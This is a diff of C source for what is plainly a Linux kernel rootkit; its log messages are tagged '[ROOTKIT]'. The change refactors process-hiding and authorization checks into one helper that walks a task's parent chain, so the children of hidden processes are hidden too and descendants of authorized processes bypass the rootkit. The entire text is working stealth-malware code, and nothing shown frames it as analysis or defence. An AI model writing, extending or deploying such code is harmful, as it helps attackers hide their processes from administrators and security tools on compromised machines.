@@ -286,21 +286,65 @@ put_return:
     return b_ret;
 }
 
-bool is_pid_hidden(const pid_t i32_pid)
+static bool is_pid_or_parent_in_list(const pid_t i32_pid, const struct list_head *const p_pid_list)
 {
-    // TODO: Also check children PIDs
-    pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to check
+    bool b_ret            = false;                      // Return value
+    pid_t i32_real_pid    = get_effective_pid(i32_pid); // Effective PID to check
+    task_t *p_task        = NULL;                       // Task with the given PID
+    task_t *p_task_parent = NULL;                       // Parent task
+    task_t *p_task_tmp    = NULL;                       // Temp pointer to keep a reference
 
     if (i32_real_pid == -1) {
         return false;
     }
 
-    pr_info("[ROOTKIT] * Checking if PID %d is hidden...\n", i32_real_pid);
+    pr_info("[ROOTKIT] * Checking if PID %d is in the list...\n", i32_real_pid);
 
-    // TODO: Check if one of the parent PIDs is hidden
-    //       Factorize common code with `is_process_authorized()`
+    // Check the given PID, and get its task struct
+    b_ret = is_pid_in_list(&i32_real_pid, &p_task, p_pid_list);
 
-    return is_pid_in_list(&i32_real_pid, NULL, &hidden_pids_list);
+    IF_U (b_ret) {
+        pr_info("[ROOTKIT]   * PID %d matches!\n", i32_real_pid);
+        goto loop_end;
+    }
+
+    // Check if one of the given process' parents is in the list
+    p_task_parent = p_task;
+    while (true) {
+        p_task_parent = get_task_struct(p_task_parent);
+
+        rcu_read_lock();
+        p_task_tmp = rcu_dereference(p_task_parent->real_parent);
+        rcu_read_unlock();
+        put_task_struct(p_task_parent);
+        p_task_parent = p_task_tmp;
+
+        if (p_task_parent == NULL || p_task_parent->pid == 0) {
+            b_ret = false;
+            break;
+        }
+
+        pr_info("[ROOTKIT]   * Checking parent PID %d...", p_task_parent->pid);
+
+        b_ret = is_pid_in_list(NULL, &p_task_parent, p_pid_list);
+
+        IF_U (b_ret) {
+            pr_info("[ROOTKIT]   * PID %d matches (thanks to parent %d)!\n", i32_real_pid,
+                    p_task_parent->pid);
+            goto loop_end;
+        }
+    }
+
+loop_end:
+    put_task_struct(p_task);
+    return b_ret;
+}
+
+bool is_pid_hidden(const pid_t i32_pid)
+{
+    pr_info("[ROOTKIT] * Checking if PID %d is hidden...\n", i32_pid);
+
+    return is_pid_or_parent_in_list(i32_pid, &hidden_pids_list);
 }
 
 long show_hide_process(const pid_t i32_pid, const int i32_sig)
@@ -366,58 +410,9 @@ void show_all_processes(void)
 
 bool is_process_authorized(const pid_t i32_pid)
 {
-    bool b_ret            = false;                      // Return value
-    pid_t i32_real_pid    = get_effective_pid(i32_pid); // Effective PID to check
-    task_t *p_task        = NULL;                       // Task with the given PID
-    task_t *p_task_parent = NULL;                       // Parent task
-    task_t *p_task_tmp    = NULL;                       // Temp pointer to keep a reference
+    pr_info("[ROOTKIT] * Checking if PID %d is authorized...\n", i32_pid);
 
-    if (i32_real_pid == -1) {
-        return false;
-    }
-
-    pr_info("[ROOTKIT] * Checking if PID %d is authorized...\n", i32_real_pid);
-
-    // Check if the given PID is authorized, and get its task struct
-    b_ret = is_pid_in_list(&i32_real_pid, &p_task, &authorized_pids_list);
-
-    IF_U (b_ret) {
-        pr_info("[ROOTKIT]   * PID %d can bypass rootkit!\n", i32_real_pid);
-        goto loop_end;
-    }
-
-    pr_info("[ROOTKIT]   * AUTH Task comm: %s\n", p_task->comm);
-
-    // Check if one of the given process' parents is in the authorized list
-    p_task_parent = p_task;
-    while (true) {
-        p_task_parent = get_task_struct(p_task_parent);
-
-        rcu_read_lock();
-        p_task_tmp = rcu_dereference(p_task_parent->real_parent);
-        rcu_read_unlock();
-        put_task_struct(p_task_parent);
-        p_task_parent = p_task_tmp;
-
-        if (p_task_parent == NULL || p_task_parent->pid == 0) {
-            b_ret = false;
-            break;
-        }
-
-        pr_info("[ROOTKIT]   * Checking parent PID %d...", p_task_parent->pid);
-
-        b_ret = is_pid_in_list(NULL, &p_task_parent, &authorized_pids_list);
-
-        IF_U (b_ret) {
-            pr_info("[ROOTKIT]   * PID %d can bypass rootkit (thanks to parent %d)!\n",
-                    i32_real_pid, p_task_parent->pid);
-            goto loop_end;
-        }
-    }
-
-loop_end:
-    put_task_struct(p_task);
-    return b_ret;
+    return is_pid_or_parent_in_list(i32_pid, &authorized_pids_list);
 }
 
 long authorize_process(const pid_t i32_pid, const int i32_sig)
